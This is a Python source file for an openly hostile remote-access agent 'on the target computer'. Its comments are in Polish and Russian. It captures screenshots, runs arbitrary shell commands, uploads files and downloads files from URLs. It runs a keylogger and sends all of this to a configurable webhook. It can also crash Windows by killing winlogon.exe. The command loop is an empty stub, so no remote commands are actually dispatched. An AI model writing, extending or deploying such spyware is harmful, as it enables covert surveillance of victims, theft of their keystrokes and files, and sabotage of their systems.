# agent.py - skrypt na komputerze docelowym
# Комментарии на русском языке

import os
import sys
import time
import json
import requests
import subprocess
import threading
import tempfile
from datetime import datetime

CONFIG_PATH = os.path.expanduser("~/.mrfa_agent_config.json")
WEBHOOK_URL = ""
INTERVAL = 5

def load_config():
    global WEBHOOK_URL
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH, 'r') as f:
            data = json.load(f)
            WEBHOOK_URL = data.get("webhook", "")
    else:
        with open(CONFIG_PATH, 'w') as f:
            json.dump({"webhook": ""}, f)
            WEBHOOK_URL = ""

def save_config(url):
    global WEBHOOK_URL
    WEBHOOK_URL = url
    with open(CONFIG_PATH, 'w') as f:
        json.dump({"webhook": url}, f)

def send_webhook(data, files=None):
    if not WEBHOOK_URL:
        return False
    try:
        if files:
            r = requests.post(WEBHOOK_URL, files=files, timeout=10)
        else:
            r = requests.post(WEBHOOK_URL, json=data, timeout=10)
        return r.status_code == 200
    except:
        return False

def do_screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        temp = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
        img.save(temp.name)
        with open(temp.name, 'rb') as f:
            files = {'file': ('screenshot.png', f, 'image/png')}
            send_webhook({"type": "screenshot", "timestamp": datetime.now().isoformat()}, files=files)
        os.unlink(temp.name)
    except Exception as e:
        send_webhook({"type": "error", "message": f"Screenshot failed: {e}"})

def do_bsod():
    try:
        if os.path.exists("notmyfault.exe"):
            subprocess.run("notmyfault.exe -accepteula -crashed", shell=True)
        else:
            subprocess.run("taskkill /f /im winlogon.exe", shell=True)
    except:
        pass

def do_cmd(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        send_webhook({"type": "cmd_output", "command": command, "output": output})
    except Exception as e:
        send_webhook({"type": "error", "message": f"Cmd failed: {e}"})

def do_upload(path):
    try:
        filename = os.path.basename(path)
        with open(path, 'rb') as f:
            files = {'file': (filename, f, 'application/octet-stream')}
            send_webhook({"type": "file_upload", "filename": filename}, files=files)
    except Exception as e:
        send_webhook({"type": "error", "message": f"Upload failed: {e}"})

def do_download(url):
    try:
        filename = url.split('/')[-1]
        response = requests.get(url, stream=True)
        with open(filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        send_webhook({"type": "download_complete", "filename": filename})
    except Exception as e:
        send_webhook({"type": "error", "message": f"Download failed: {e}"})

def start_keylogger():
    try:
        from pynput.keyboard import Listener
        log = []
        def on_press(key):
            log.append(str(key))
            if len(log) >= 50:
                send_webhook({"type": "keylog", "data": ''.join(log)})
                log.clear()
        Listener(on_press=on_press).start()
        send_webhook({"type": "status", "message": "Keylogger started"})
    except Exception as e:
        send_webhook({"type": "error", "message": f"Keylogger failed: {e}"})

def stop_keylogger():
    try:
        subprocess.run("taskkill /f /im python.exe /fi \"windowtitle eq keylog\"", shell=True)
        send_webhook({"type": "status", "message": "Keylogger stopped"})
    except:
        pass

def command_loop():
    while True:
        try:
            time.sleep(INTERVAL)
        except KeyboardInterrupt:
            break
        except Exception as e:
            time.sleep(INTERVAL)

def main():
    if len(sys.argv) > 1:
        save_config(sys.argv[1])
    else:
        load_config()
    
    send_webhook({"type": "status", "message": "Agent started", "hostname": os.name, "timestamp": datetime.now().isoformat()})
    
    threading.Thread(target=command_loop, daemon=True).start()
    
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        send_webhook({"type": "status", "message": "Agent stopped"})

if __name__ == "__main__":
    main()
